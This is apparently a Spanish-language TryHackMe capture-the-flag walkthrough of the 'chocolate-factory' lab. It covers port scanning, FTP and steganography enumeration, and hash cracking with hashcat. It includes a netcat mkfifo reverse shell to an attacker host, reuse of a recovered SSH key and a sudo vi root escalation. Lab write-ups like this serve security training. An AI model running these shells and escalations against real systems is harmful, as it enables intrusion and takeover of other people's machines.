Bienvenidos a otra sala en tryhackme. Escaneamos puertos abiertos con nuestra herramienta bien nombrada. Luego, enumeraremos la maquina entrando al servicio ftp, utilizando steghide para extraer informacion y luego logearnos con sus credenciales en su servidor web para generar una reverse shell en nuestra maquina atacante. Por ultimo, obtendremos la id_rsa de charlie, establecemos una conexion ssh y escalar privilegios a root utilizando vi y un script en python alojado en ./root.

# Recon

Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap`

```ruby
Nmap scan report for IPTARGET
Host is up (0.23s latency).
Not shown: 65506 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
100/tcp open  newacct?
101/tcp open  hostname?
102/tcp open  iso-tsap?
103/tcp open  gppitnp?
104/tcp open  acr-nema?
105/tcp open  csnet-ns?
106/tcp open  pop3pw?
107/tcp open  rtelnet?
108/tcp open  snagas?
109/tcp open  pop2?
110/tcp open  pop3?
111/tcp open  rpcbind?
112/tcp open  mcidas?
113/tcp open  ident?
114/tcp open  audionews?
115/tcp open  sftp?
116/tcp open  ansanotify?
117/tcp open  uucp-path?
118/tcp open  sqlserv?
119/tcp open  nntp?
120/tcp open  cfdptkt?
121/tcp open  erpc?
122/tcp open  smakynet?
123/tcp open  ntp?
124/tcp open  ansatrader?
125/tcp open  locus-map?
...
```

Bueno, tendremos muchos puertos abiertos, que en la mayoria no nos llevara a ninguna parte, solamente nos centraremos en los 3 primeros puertos. Iniciamos entrando al puerto ftp(21) por posibles archivos o notas de texto. Recordemos que podemos iniciar sesion con usuario Anonymous sin necesidad de password.

```bash
ftp IPTARGET

ftp> ls
229 Entering Extended Passive Mode (|||58263|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
226 Directory send OK.

```

Encontramos una imagen en la que podemos utilizar `steghide` para extraer informacion .

```bash
ftp> get gum_room.jpg # Nos transferimos la imagen

# Utilizamos stehide para extraer informacion
steghide info gum_room.jpg
steghide extract -sf gum_room.jpg
Enter passphrase: 
wrote extracted data to "b64.txt".
```

Nos extrae un archivo .txt codificado en base64. Ejecutamos echo para decodificar el contenido para luego encontrar las credenciales de charlie. La pasamos a un archivo nuevo .txt y utilizamos hashcat para crackear sus credenciales.

```bash
# Decodificamos
echo "REDACTED" | base64 -d

# Creamos charlie.txt y pegamos las credenciales de charlie
nano charlie.txt
$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8z...


# Identificamos el tipo de hash y luego crackeamos con hashcat
hashid charlie.txt
Analyzing '$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq846...'
[+] SHA-512 Crypt

hashcat -m 1800 charlie.txt /Path/wordlist
```

# Intrusion

Luego de secuestrar las credenciales de charlie, navegaremos al servidor web y logearemos con su cuenta.
Tendremos una consola para realizar comandos. Corroboraremos que se pueda leer el directorio /etc/passwd y si es asi generar una reverse shell en nuestra maquina atacante.

```bash
cat /etc/passwd 

# Nos ponemos en escucha en nuestra maquina atacante
nc -nvlp LPORT

# Ejecutamos
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc LHOST LPORT >/tmp/f

# Upgradeamos nuestra shell
script /dev/null -c bash
CTRL+Z
  stty raw -echo;fg
  export TERM=xterm
```

Dentro del sistema, nos dirigimos al directorio /home/charlie. Podemos reclamar nuestra flag y vemos dos archivos llamados **teleport y teleport.pub**. Investigamos el archivo teleport con cat y copiaremos la id_rsa de charlie, le daremos permisos 600 y establecemos una conexion ssh como usuario charlie.

```bash
# Nos movemos al directorio
cd /home/charlie 

# Investigamos el archivo
cat teleport
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4adrPc3Uh98R...

# Lo pegamos en nuestra maquina atacante como id_rsa y le damos permisos
chmod 600 id_rsa

# Establecemos conexion ssh a charlie
ssh -i id_rsa charlie@IPTARGET
```

# Priv.Escalation

Listamos permisos de supuer usuario y escalamos privilegios con vi https://gtfobins.github.io/gtfobins/vi/ 

```bash
sudo -l
User charlie may run the following commands on chocolate-factory:
    (ALL : !root) NOPASSWD: /usr/bin/vi

# Escalamos a root
sudo vi -c ':!/bin/sh' /dev/null
```

Ya somo root, pero si nos dirigimos al directorio /root encontramos un script .py que si lo ejecutamos nos pedira una key. Si observamos el codigo, podemos ver la key encriptada. Los textos encriptados son extremadamente dificiles de desencriptar, asique buscaremos dentro del sistema la key a introducir para reclamar nuestra flag.

Dentro del directorio /var/www/html encontramos un archivo **key_rev_key**. Nos transferimos este archivo a nuestra maquina atacante y le lanzaremos un strings para investigar este binario. Encontramos la key y volvemos nuevamente a /root a ejecutar el binario, esta vez introduciendo la password y reclamamos nuestra flag.

```bash
# Cambiamos a directorio
cd /var/www/html

# Abrimos servidor python http
python3 -m http.server 3333

# En nuestra maquina atacante
wget http://IPTARGET:3333/key_rev_key

# Lanzamos strings en el binario
strings key_rev_key
Enter your name: 
laksdhfas
 congratulations you have found the key:   
b'-REDACTED='

# Nos movemos a /root y ejecutamos el bianrio
cd /root
python root.py
```

